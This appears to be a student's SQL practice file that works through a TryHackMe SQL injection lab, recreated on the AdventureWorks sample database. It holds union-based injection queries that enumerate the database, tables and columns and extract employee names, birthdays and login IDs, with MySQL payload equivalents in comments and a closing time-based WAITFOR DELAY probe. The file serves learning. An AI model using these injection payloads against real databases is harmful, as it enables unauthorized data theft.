/*
Jenny Ross
6/28/2026

SQL injection practice
*/

-- SQL Injection
-- Task 5
-- In-Band SQLi
-- https://tryhackme.com/room/sqlinjectionlm

-- Mock Browser original URL
-- https://website.thm/article?id=1

-- Using a database I already know and am familiar with from Intro the SQL class
-- Standard product list with three columns
USE AdventureWorksDW2017
SELECT P.ProductKey, P.ListPrice, P.ProductSubcategoryKey
FROM dbo.DimProduct AS P;

-- Add a union, adding the correct number of inputs to the select statement
SELECT P.ProductKey, P.ListPrice, P.ProductSubcategoryKey
FROM dbo.DimProduct AS P
UNION SELECT 1,2,3;

-- Shows the first match (from the database) and then the second match (the union with arbitrary numbers of the correct expression length)
SELECT P.ProductKey, P.ListPrice, P.ProductSubcategoryKey
FROM dbo.DimProduct AS P
WHERE P.ProductKey = 1
UNION SELECT 1,2,3;

-- To just get the first result (or, what is returned from website) to display my data, select a key that doesn't exist
SELECT P.ProductKey, P.ListPrice, P.ProductSubcategoryKey
FROM dbo.DimProduct AS P
WHERE P.ProductKey = 0
UNION SELECT 1,2,3;

-- See what database we have access to
-- Original TryHackMe website uses the DATABASE() function, which is used in MySQL and MariaDB. Also need to convert a type to a string so it can display the database info (which is a string and not an int)
SELECT P.ProductKey, P.ListPrice, CAST(P.ProductSubcategoryKey AS VARCHAR)
FROM dbo.DimProduct AS P
WHERE P.ProductKey = 0
UNION SELECT 1,2,DB_NAME()
-- UNION SELECT 1,2,database() --> MySQL

-- Get the tables in the database
SELECT P.ProductKey, P.ListPrice, CAST(P.ProductSubcategoryKey AS VARCHAR)
FROM dbo.DimProduct AS P
WHERE P.ProductKey = 0
UNION SELECT 1,2,STRING_AGG(TABLE_NAME, ', ') FROM INFORMATION_SCHEMA.TABLES
-- UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' --> MySQL

-- Access a different table
SELECT P.ProductKey, P.ListPrice, CAST(P.ProductSubcategoryKey AS VARCHAR)
FROM dbo.DimProduct AS P
WHERE P.ProductKey = 0
UNION SELECT 1,2,STRING_AGG(COLUMN_NAME, ', ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'DimEmployee'
-- UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

-- Extract Employee name, birthday, and loginID
-- DATABASE HACKED
SELECT P.ProductKey, P.ListPrice, CAST(P.ProductSubcategoryKey AS VARCHAR)
FROM dbo.DimProduct AS P
WHERE P.ProductKey = 0
UNION SELECT 1,2,CONCAT('Name: ', E.LastName, ', ', E.FirstName, ' || Birthday = ', E.BirthDate, ' || LoginID = ', E.LoginID) FROM DimEmployee AS E





SELECT TOP 1 DB_NAME()
FROM dbo.DimProduct AS P
WHERE DB_NAME() LIKE 'AdventureWorksDW2017_'
WAITFOR DELAY '00:00:02'
